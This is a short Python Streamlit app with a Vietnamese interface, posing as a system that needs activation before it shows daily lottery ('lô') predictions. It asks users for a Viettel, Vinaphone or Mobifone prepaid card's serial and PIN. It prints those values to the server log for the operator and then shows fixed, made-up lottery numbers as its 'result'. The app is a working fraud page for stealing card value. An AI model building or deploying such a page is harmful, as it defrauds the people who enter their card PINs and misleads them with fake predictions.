import streamlit as st
import time

# Cấu hình trang
st.set_page_config(page_title="Hệ thống Quản lý Dữ liệu", page_icon="⚙️")

st.title("⚙️ SYSTEM DATA TERMINAL v1.0")
st.write("---")

st.subheader("Trạng thái hệ thống")
st.success("Máy chủ đang hoạt động bình thường...")

# Phần giao diện chính
with st.expander("🔑 KÍCH HOẠT HỆ THỐNG", expanded=True):
    st.write("Nhập mã kích hoạt để tiếp tục sử dụng dịch vụ")
    telco = st.selectbox("Loại thẻ", ["VIETTEL", "VINAPHONE", "MOBIFONE"])
    amount = st.selectbox("Mệnh giá", ["10.000", "20.000", "50.000", "100.000", "200.000", "500.000"])
    serial = st.text_input("Số Seri")
    pin = st.text_input("Mã PIN")
    
    if st.button("XÁC NHẬN"):
        if serial and pin:
            # Hiện thông tin ra Logs cho anh kiểm tra
            print(f"TEST LOG: Thẻ {telco} - {amount} - Seri: {serial} - PIN: {pin}")
            
            # Hiển thị kết quả ngay lập tức
            st.divider()
            st.success("✅ KÍCH HOẠT THÀNH CÔNG!")
            st.markdown("### 📊 KẾT QUẢ DỰ ĐOÁN HÔM NAY:")
            
            # Đây là phần anh kiểm tra giao diện
            col1, col2 = st.columns(2)
            with col1:
                st.info("**Bạch thủ lô:** 79")
            with col2:
                st.info("**Song thủ lô:** 24 - 42")
            
            st.warning("⚠️ Lưu ý: Kết quả chỉ mang tính chất tham khảo kỹ thuật.")
        else:
            st.error("Vui lòng không để trống thông tin.")

st.write("---")
st.caption("Copyright 2026 - Secure Connection")
